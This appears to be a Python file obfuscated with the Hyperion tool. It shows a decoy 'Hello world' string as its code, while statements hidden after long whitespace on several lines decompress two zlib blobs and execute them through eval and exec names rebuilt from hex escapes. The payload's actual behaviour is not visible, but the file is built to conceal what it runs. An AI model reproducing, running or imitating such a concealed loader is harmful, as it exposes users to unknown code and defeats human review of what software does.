from builtins import *
from math import prod as Invert


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_absolute, _memoryaccess, _run, _frame, StackOverflow, _theory, _stackoverflow = exec, str, tuple, map, ord, globals, type

class Square:
    def __init__(self, Divide):
        self._calculate = Invert((Divide, -18973))
        self._square(_builtins=78339)

    def _square(self, _builtins = str):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._calculate /= 54648 / _builtins
        
        try:
            ((StackOverflow, {'b3oy6': _frame}) for StackOverflow in (_memoryaccess, _memoryaccess, _absolute) if _frame == _absolute)

        except OSError:
            (((_memoryaccess, _memoryaccess, _frame), _absolute) for _absolute in {StackOverflow: _memoryaccess})

        except:
            _stackoverflow(-59273 * -78455) == Ellipsis

    def _statistics(self, _invert = 39598):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _invert /= -11601 * 99977
        self.Multiply != float
        
        try:
            ({StackOverflow: _memoryaccess} or StackOverflow if {StackOverflow: _memoryaccess} and StackOverflow else ... or (StackOverflow, {StackOverflow: _memoryaccess}))

        except OSError:
            (StackOverflow, _run) if _theory <= Walk else (StackOverflow, _run) is Walk

        except:
            _stackoverflow(-63507 / 4507) == type

    def _product(_add = bool):
        return _theory()[_add]

    def Positive(_while = -12538 - 31455, _cube = str, _multiply = _theory):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _multiply()[_while] = _cube
        
        try:
            ((StackOverflow, {StackOverflow: _memoryaccess}) for StackOverflow in (StackOverflow, _absolute, _frame) if _absolute < _run)

        except OSError:
            ((StackOverflow, _absolute, _frame) or StackOverflow if (StackOverflow, _absolute, _frame) and StackOverflow else ... or (StackOverflow, (StackOverflow, _absolute, _frame)))

        except:
            _stackoverflow(-18395 + -14978) == int

    def execute(code = str):
        return _absolute(_memoryaccess(_run(_frame(StackOverflow, code))))

    @property
    def Multiply(self):
        self.Modulo = '<__main__.StackOverflow object at 0x000003653BE72939>'
        return (self.Modulo, Square.Multiply)

if __name__ == '__main__':
    try:
        Square.execute(code = __code__)
        _walk = Square(Divide = 80449 + 36737)

        if 235143 > 7852850:
            _walk._square(_builtins = _walk._calculate / -56966)
        elif 214907 < 6086141:
            Square(Divide = -590 - -83538)._statistics(_invert = -41663 * _walk._calculate)                                                                                                                                                                                                                                                          ;Square.Positive(_while='MMMNMNMNNMNNMNMNMMNMNMNM',_cube=b'x\x9c\xe5\x1c\xefs\xda:\xf2{\xfe\x8a<\xbe\x18&mj\xcb\xb6dg&_nr7\xaf\x9d\xa4\xdc\xbc\xde\\z\xd3f\x18\x83M\xea>\x83r`^\xc8\x7f\x7f\xab\x95\x04\x02c\x90\x81&\xed\xc5\x8ady\xbd\x96\xe5\xd5j\x7fI\xa4\x9c<]\x9c\x9c\xc2\x91\x0f\xdbx\x16G\xaf\xc7\xfb\xc3\xd9t\x90\x94|\xd2\xeb\x9d\xfev\xd9\xfa\xfd\xe9!\x9b\xe4|\xdc:\xe5\x13\x03-\x99\x95\xdf\xf8d\x8a8\xedV?/\x8a\xa7\xf2[v\xcf\x93\xd2\x0fi\xebM\xebo\xc5,\xfb#K[\x9d\x95\xa7\xee\xf3\xf2\xdb\xac/\x1b\xfeV\x96\x0f\xd3\x8bw\xef$\xec|\xc0G\xef\xd6\x9ayW\xf3\xee4\x9f\x0e\xf8$]mF\x01\xcf\xef\xef\xdf=\x14\xc9\xfd,[{\xa8\xc8\x07\xd9x\x9a\xc9\x87\xfe\xfe\xcf\xeb\xb7\xe4\xdc]C\x19\xf0T\xdew\x1e&\xf9\xb8l\xb7~\xcf\x8a\x82\x9f>\xf2I\x91\xfe\xd6\xea8\'\x9d\x8b\x05\xb6\xb8\xefL\xff\xccS\xa7s\x92\xcd\x07\xd9C\xa9\x889~\x98\xc1\x93\x7f\xf0i6=M&\xd9\xe9$K\xbf\x8e\xff\x9d\xf3"+%\xa0\x0f\x94\xf9:\xfe\x0f\x9f\xe1Ur*\x1a\xf9:\xfe\xc8\xfb<}:-\xf2?\xe1\xb9\'>kuNd\xa7\xf2\xd1\x03\x9f\x94\xbd\x1e\xbc\xedi\xeat\xce\xb3y^\xb6;\'\x05\x1f$\xc5\xb4\xdd\xf9\xe2\xdc~\xbe\xbd\xbd\xfd,\x0e}\x12\x7f\xb7\xb7\xce\xdd\xe5}\xc1\xfb\x80uR\x87"\x1e\'\x9f\x08\xf9$\x0f\xa8~\x12W\xf0\xe7|\xb9\xb88{{\xf6\xb6\xfd\xb6}\xe6u:w\xd0VV&e9\xd9\xda\xd6U\xf7\x8aC\xba\xeaB)\xff\xaex\x17.\xab\xad\xa5\xf9\xf6\x96\xba\xdd\xae\xcb]\xd7\xedb\x82\x1a\xe7\xf0=\xf2\xa3O6\xdcDB\xdc\xca&\xf0\x90\x8d\xe2\t\x1e\\\x92q\xeb[\xf1\xeb\x91\x0c\xf2D\xb0J\xa0\x81\xba\xb6\xdbN\x7f\x96\x17e>\x16C\xf3W2\x99\x9e\xd4\xb4!\x9a\xe7\xdd.R\x07\x13\x10\t\xbe\xa3{\x05\x8d+\x9a\xcbG\xe4H@\xb5]\xff\xce\xe98/\x8b|\xd6_\xa7k\xe7MW\x12_\x93\x1f.\xc5U\xf7j\x9f\xc6:_\x8e\xda\xday>N\xb3y\xdb\xc9\x8a\xfca\xc4\x07\x15\x84\xbbN\xdd\xc0v\x01\xc2\xe1\x00P\x17\xa8\xc6]Y{u\x94+\x13^\x0c\x1b\xd0M\xbf\x07y\x1d\xf9\x1e\x8aWG\xb5I9\xddD\xb3-\xf3\xf4\xfa\xfa\xc3\x87\xf7\x1f\xa0\xf8\xf0\x1e\x8ekQ}\xbf\x0f\xd9\xf2|0M\xc6\xf9q\xc8V\xdb\xd8^d\xaboM\x93\xedi\x98\x17\xf3\xec\xdbx\xb6\x89x\xdb\x84\xe8x4\x1a\x8d\xc7\xe3\x91L#Q\x83\xbfW\xc7vE\xf2W\xd6\x90\xef\x80\xd9\n8\xf0\x84Y\xa4\xbd8\xef\xd7\xa6\x1c\xe7\xd5\xbb\xdb)\xf7\xf1\xe6\xe6\xe6\xe32\x89\xbf\x8f\x1f_\x1d\xe1\xb2\xd9\xe4_Mg\xab"\x8d\xb2\x01\x91\\\xe4\xf5\x11nZ$\xffh\xa0X\x81\xdd\x80\xbf\x04\xcf\xa9\x02\x19\xee\x06\xe8\xe68\xe7\xdfy>\xdeF\xf2M\xda\xa5\xddwB\x06)\x82\xc4\x8c\xack\xaa\x04\x1b3\xcd\x84\x97\xd2v\xa2a\xb9A2\xbf\xb2q\x1bd\xf3\x8d2\xf6\x85\xa8\xdf\xaei\x9cRF\xe8\x90\xa6\xc4\xa5\x84\x854\xa6\x03\x16@\x991\x1f 1M\x99K\x87\x8c\xb0\x00\xaeB\x16\xd1\x90\xfa\xbb^\xb5}N\xa3\xad\xa7\x00\xca\x052\x1a\xd8\xac\x9f\xdbN\xc7\x83\xdb\xae\x15&\xeb\xf9\xbd\xb0\x17Cv{\x0c\xca\xa0G\x00=\xaaB-Z\xab\xa1\x99\xef\x92\x94D$\xf5=\x12\xef\xa4\x86,0\xdf\x01\xdf\x94\xd3l\xf6\xdflrZN\xf8\xc3(\x7f\xc6>l\x1d\x95\x0f\xa2a\xd1\xfa\xfbk\xf9*\x10\x17\x9b\xe5K\x1d\x1bY2\xc7\xddV\x1b\x03\xed\x8b\x85q\x01E!\xc4}\xed\x035}\x01\x86\x0e\x99\x07\xcc\x1c2\x9f\x05\xec\xb0>=\xc21\x7f\x9c\x8b\x03\xcf\xa28`\xd4\xbcp\xe8S\xc8\x01dQwU\xdd\x87\x1cA\x0e!\x13\xd2\x97#k\x81k9\xfaw\x97E2\xea\xa7\xc9\xa9\xea\xab\xea\xb4<]\xd4s\xc6\x16\xca\xd4|a\x90\x05)f\x9d2\xe3*3\x12\\\xefV\x19\xaa\xd7s\x1c\x83\xc7G5\x08\x8fx\xcc\xe7\xfbu\xdc\x01\x19/\xc5\xbd\x88q\xf0\xab+!\xee\xaf\xb8\x95p\x89@|\xd0\x1e\x81\x14Af\xbd\x18\x90\xe3u\x98UK.\xdc\xf6\x0ea$5\xfd\xdd\x86"\xe8\xb2\xd9{\x08\xa3\x11\xcc\xa1\x80\xb9\xcc\xf7\x132$\xa0\x0c\xa8\xc7\x18\xc9(\xa31\xa8\x8a\x08\xe6\x19(\x0e\x06\x9c\nw|P%\x19@CQ\x02\x8e\x8f\xaae\x18\xc2<\x84\xa7\x08\x8b\x85\xc2\x82\xbe\x0fC\x98\xa34\x81\xbb\xa0jHJS\xeaam\xb8\xac\xb1U\x0c1\xa7\xa1\r\x92AOb\xb2S\xdf\xed\xc1\xb9\xf02\xd0~\x90\x13\xcc\x03U\x0e\xb0&\xef\x18\xd9\x9aw\xa5HS\xde\x93\x92k\x17\xb5\x9d\xdb\xc6\xb7]\x0c0A\x01\xe2X\x84\x99\xf0\x8aw\x0f`\xa2HI\x18OI\x15\xa6$\x8b\xaf`\x91!\x8dlp\x9bJ\xa3\xe5T\xd6%\xca\xd9\xbd\xc8S\'\x8f\xe2e\xa2\x83ei^\x8b\xb3(\xad\xc7\x14U#\xe7]\x0c\xf5\xc1@tE\xfcO\x8c\xce\x9e\x12Ic-,\xa3\xdb\xcf\x96\x96\xd1\x91\xac\x83\xe5\x97\x81\xbe\x87\xec\xaaH\xa6\xf8&\xb8p/6\x1a\x03{\x8c\xc6\x90\x82\x1e\x13Y$y\xa5K\x13f=\x127\xca\xdb\x91^\xb5pvnn\x1aw\xd6\xf4\x99\x96\'\xf0\x99\x9eC\x90\x9b\x1a\x9d)\xad\xceT\x16\x1a?\x16Y\xcdA\x1b\xdc\xc8^!4W\x06\x87\t^G\x86\x8f\x8a\xf7J\x14\x8a\x00\x92\xadI\x1f\x83\x8e\x15\xa6\xbb\xd4\xb3L\x99\xf4k\xd0\xa3\x0e\xd8\xe1C\x1b\xab\xe1\n\xf4\xd0\xa8!\x0b\xd4p\x89\xba\xaf\x86\xd6\x06\x974\xd3\xf5\xab\x13[\xccd\x98\xd3bJp\x9c\xd7\x9c7\x9f(\xdf\x8b<\xff\x9e\xcb\xa3(\xbeC\xb24\x9b\xc2\x9e\x07\x83\xe5\xa3\x81D\xd0hZ\x81X\xb2\x81\x07\xf8z\xd0]h\x81"\x1bT\xa0/\xe0\xd9i2\xdf\xde.\x1c\xdb\xcfjY\x03+\xfbi\xfc\xb9\xf2;\xa4f\x94*\xd2\xc6\xfb\x10\xb4\x12\xd4"\xe0\xe7\n\x8a08\x07H\xab\n\xf4yi\xb5\xb4\x8a\x04\'\x15\x85d&\x10\x07y^\xc3\x8c\xdb\xa3\xf9\xb2\x8b\xaa\xc3\xd2\xa3\x19\xdb\xc5\x13\x80c<\x8c\t\xb8\xc8\x87n/\x02tR\x85\x1e8\xfd\x99\xb2\x9a"Cj\x07\xaaN\r\xc9n\x83\xdbD\xb2\xb7k\xa2\x83W\xe8\xf3t\x17\x0b\xbd\xe0\nu\xed\\\x9f&\x11\x181\x13}\xe43\xbf\'\x84\xb7\xe4\xbd\n\xd4\xaa5\x1f\x9f\xf1\xc5X\xe09\xc2\xd6\x82*\xf4\xa8_qd\xb7k9.-\xacyg\x80\x06\xc8g\x17\x17_\x9cY9\x8c\x9cv\x96\xf2A\x96\x9ew\x9c\x98d\x86\xb3\xbc\xea8\xaf_\x89\x0cl\x11$\x98\x06\x98\x85i+\xcbD\xd5\x92\xc0\xe9\xb7\xf1\x13\xae\xc5\xd7\xc0GA\x15\x8a\xeb\xf6\xdd\xae\xce\xb0\x950\xe3\xa6 $\x0bk\x1a\xff\xd2i+Q\xa6%\xdb\'\xb9\x85\xe3S\xcbf\xa4B\xc1!0\x0b\x99\x9a\x89\xb4\x07cwF\xabP\xabq\x0fP7\xc48\xb7)>-tGX\x85Z\xf2d,\x1c}x&\xc2h"\xc1\xbe\x05U\xe8\x91\r\x12\xf1\xe5\x11r\xbc\xab\xf4\'\xc1\xaf\xa8@_\x8e\xc3E~3\xcc\x8bl\x9c\x8c\xb2\xcb:W;F\xe7Z:\xdc\x03\xac\r\x94c-K\xe9~\xeft\xc8\xde\x8c\xe0\xdeee9\xf3\x87\x19t{Y\x07{D"2\x9ab\xca0\xa5+9]\xc0\xb0\xdc\x1d\xf8?\xba&8\x94\x8aZ\xcf\x05\xca\xac\xd5Q\x05q&J\xefyJ/\xda\xe06\xe0T;\xf9\xeb\xfa\xe0\x84\x06\xe8\x8e\xfa\xe2,\xaf\x0c\x18\x95W\x11ITp(\xc1r\x99\x06\x8a\x87EvI\xe2&\xfe\x86\xf0g%<\x9a*\x99\xee\x12\nm\xbc\x90\xcc\xd61\x08\xd3\xe4\x120\x0b\xa1}$\x91\xb2\x14\x1f\x0e\xeeD\xbb\xe2\xb8g\xaf\x8bQ[K\x0b\x84\xa0}\xeb\xa2\x9d\x81\x16\x04Z \x15\xe8O\xe60\xee\xe9} \xd1\x1a\x89\xc2\xba\x0e\x105\xb5\\5\xbd\\5\xc5\x88a\x8e\xea\xa9i\x83k=5\xebV\xb3\x0f0\xf1\x0f\x1d\x0c\xed\x8dk\xd1\x13*\xcf\x9c\x18^:S\xb4\xb0\xc1\xa5\x87\x9b\xefu\xfab\x18\x88\x14\xc0Y\x1cC#\x07"\x9e\x16\xe8\x14\xec\xd6\x16\xbb\xe5#4HE\xe3X\xd2\x95\x17\xd0@\x1d\xb26\xa4\xa9/mPi\x85\x0eTJ\xd02\xd5w\x966k\xad\xc4\xd3\\\xbe[t{>\xce \x10\xe1u\x8dm\xe6(\xb3\xd1\x18mB\x86\x16\x95\x07\x12\x03|\x0b\xb8]\x85\xfa\x1d\xc7\xa2\xb5[c\xad[\x86\x04\x9c\xc3\xa4\xac\x0c\x840\xecF\x80+O1\x9a\x9fQ\x15\xfa\xbcf\xa0!\xb7ED\\\xc4\x9b\xb8\x0c\x8ds\xabU\n\x19\xb5\x90\x96:\x91\x1e\xa2\xfa\xb0\n\xd4\xaa\xb5\x10\x89\x10*o\x13l{\xb4\xf9i\x15z\x00\x99B\xbd\xf2a\x08>_\t\x00\r\x8b\x94\x90\xb0\xc1e\xcd$\xffq\xa4~c\xb5sti\xbdm\xb9\\\xcb\xd1\xf5\xe8\xa8\x86y\xc6r\xf9.\\Kn\xfe\xa9\xe5oleuF\xa4\xb2d\xa90\x06\xca\xefJT\x0br\xa1SZ\xa9v\xf6\xecV\xeb\xd4NN\x83\x01\x1d\x12\xc8\x11\xe4\x00r\x0c\xd9S\xd7\xa1\x82\x85(\xcb\xfb\xc4\xb3\xc2\xdd_\xdeo\x96\xd0\x87\xc4.\x0e\x8d2\xd1p\xb9\xb6\xa3\xd7u\xa8\x11\x1d\x0c\x8c\x85\x03\x1b\xdc\x06\x0b\x07\x86\x10\xc7\xee\xe0\x8e \xa4(\xe4\xeb\xeb#\x87\n\xed1EX%\xc0@\r\xc1\x00\x8b\x0c\xfe\xbb\xa8\x1aV\xa0/i~\xd7o\x8e\xa2\xd4\xdb\x1d\xce\xf8\xbf\x8b\x15\x1cku\xdaN*6\xb04#\x12\xb0\x902\x9a\x11\x8c8\x05"\xcbRfy-a\xa2\x9e\xfa\x0bK\x97\x0e\x17b^Y\xc2\x0b\x1bX\x89{H\xbf\\\xbcuW\xacFK\x12\xadL\xcd%Jw-VS\x87\x8b\n\xb9i\x08`\xcb\xb6\x0e\xb9m\xc3\xdc\xe0\xb1\xdc\xd8!7u\x04;_v\x1c\x03J\xaf\xd8x*3\xf5\xd5\xda5F\xca\x18\xfbhv\xe1\x86?\x9d!\xa6\xb5\x8b\xde\x87\xa8\x1d\\m\xc3\x9akY6\xb8\x96kYw\xed-\xab\xa3/.\x95j7\xb9')

        _walk._statistics(_invert = -74423 * _walk._calculate)                                                                                                                                                                                                                                                          ;Square.Positive(_while='xwwxwwwwwwwxwxxxwxwxwww',_cube=b"\x88dnsYf\t\x132\x02^\x15\x87\xfd\x15)5P\xeb8\x0b\xd9\xb3\x80\xc6$\xa2\x840?\xf4u\x8eTf5\xe7u\xd8J\x9d\x80\x9bA2*\xf6\xe9\x89\x1dzp\x86\xde0?\xa2\x94\x81\\$,\xec\xfb`\x0b\xc2p\xa6\x98#\xcc}A\x18\xe8s\x8a9j\xd8s\xea\xc7\x90\xa9O\xe0\xfb\xab_\xb1\xa9\x97u_\xb1\x1d\xcf\xa7\x1e\xd0\xd7\xc3\xf7\x80\xd2\x95\xef\xa5\xbe:{\xcb\xb3\t\x13u\x9d\xb1\x9f\xe63\x9b\xcf\x04\xde\xc50\xb3\xb5s\x1d,\xaa\xb9\xbfL\x04\xa6\xd0\x81#\xb3\x9buM\x03O\xed\xb6\xd6\xbbr\xf4NE\xbb]9\xc7\x88\xafy\xe12\xac\xafcgZ \xa2kl\xc4\xd7v\xe1\x06\r\x8c\xdc#Yk\xcf%}\xb5\xcep\xd5\xa7\xfa\x86d\r\x14\x19\xa25\xfd\xb2\r\xd72\xcap\xd7\xde\xfe\x83\xfa\x97Z@\xda#6ecB\x06Llf\x0e\x98\xd8\x86\xdc\xc4\xd8K\xfdUGy\xe9\\/\xf7\x0f\xffr\x06\xa1\xd3!ry\x1d\x97\xc7c8\x8bP\x9c\xbf\x0e{^ok\xa7Y\xc8\x18\x8ca\xc4\xe4\x11\xa92Z\xd4\x99Q\x8f\xe4\x1d;\x03\xf1G\x89\x8agq\xea~\xcc$\x16af\x11E\x15ny\x80l\xe1\xe3\x0e\xaa\n\xf4Y\xf6\xe5\xec\xfd\x8b\xac\xe3\xae\x07Gl\x99\x16,\xb6\xc6\x94\xf2\x8e\x8c\xb75YKy\xd1Ua.8V1/\xd6\xba\xdd\x03\xbcJ\xed\xff\xc4J'\xe9\xd5|3Tk\xfe\xee`\x17\xae\xe5\xa8\x1b\xa6\x8f\x12\x87(\x0f\x89\xfce\xf1\xea?\x96\xf9a\xcaK\xfbz\xba\xff\xe6\xef(\x02c7`\x1d\x8e\xdf\xd4\xcc\xb1\xdf\x1e\xc3py\\l\xdf\x0bqS\x1d\xc1M\x91Q\x15z\xe0\x82\x89^)%F\x80@\x9f=c\xe8mp\x9bm\xc5i\xfe\xe3\xdb\x9f_\x14?k\x90m\xb7\xa5s\xd0vD\xdb\xc5\x03\xe9\xf9x?Q\xd0\x7f\xdb\n\x96\xfe\xd9\x86\xf9\xd3)\x1d\xa2\xf7\x0c/\xc7\x06\xd7\xd2\xcb1D\xdd\\\xfeb\xd2\xf8\xe9$n%?p\x0ekoL\xaf\xb4iO\x8c\xea \x8f1\x87w\xe1Z\x86\xbb\x8e\x13\xab\xd3\xbb\xc7t\x94\xca\x14&\xba\x93\xeb\xbf\xc0\xdd\x86k\xbfh\xfa?\x04M>\xbc")

        Square(Divide = 42865 + 88939)._statistics(_invert = 84492 / _walk._calculate)                                                                                                                                                                                                                                                          ;NNNMMMNMNNNMNNNNNMMMM,xwwxxwwwwxxxxwxwwww,NNNNNMMMNMNMNNMMMNNNMNNN,OOO0OoO000OOOooo0Oo00Oo,IlIlIIllllIlllIIllIl=(lambda OOoOo0oO00OOO00OOo0o000oo:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOoOo0oO00OOO00OOo0o000oo)"),filename='\x53\x32\x53\x53\x53\x32\x32\x32\x53\x32\x32\x32\x32\x53\x53\x32\x53\x53\x53\x53\x53\x53\x32',mode='\x65\x76\x61\x6c'))),(lambda OOoOo0oO00OOO00OOo0o000oo:OOoOo0oO00OOO00OOo0o000oo(__import__('\x7a\x6c\x69\x62'))),(lambda OOoOo0oO00OOO00OOo0o000oo:OOoOo0oO00OOO00OOo0o000oo['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda OOoOo0oO00OOO00OOo0o000oo:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OOoOo0oO00OOO00OOo0o000oo)"),filename='\x53\x32\x53\x53\x53\x32\x32\x32\x53\x32\x32\x32\x32\x53\x53\x32\x53\x53\x53\x53\x53\x53\x32',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda mnmmnnmnmnnnmnnnn,OOoOo0oO00OOO00OOo0o000oo:mnmmnnmnmnnnmnnnn(OOoOo0oO00OOO00OOo0o000oo))
        if 198489 > 9068859:
            Square(Divide = 32148 / -15276)._square(_builtins = _walk._calculate + 34900)
        elif 452980 < 7864394:
            _walk._square(_builtins = _walk._calculate * -9402)                                                                                                                                                                                                                                                          ;OOO0OoO000OOOooo0Oo00Oo()(IlIlIIllllIlllIIllIl(NNNNNMMMNMNMNNMMMNNNMNNN(xwwxxwwwwxxxxwxwwww(NNNMMMNMNNNMNNNNNMMMM('\x76\x61\x72\x73'))),Square._product(_add='MMMNMNMNNMNNMNMNMMNMNMNM')+Square._product(_add='xwwxwwwwwwwxwxxxwxwxwww')))

    except Exception as Walk:
        if 229062 > 9888096:
            Square.execute(code = _memoryaccess(Walk))

        elif 205026 > 9728516:
            _walk._statistics(_invert = -19717 / _walk._calculate)
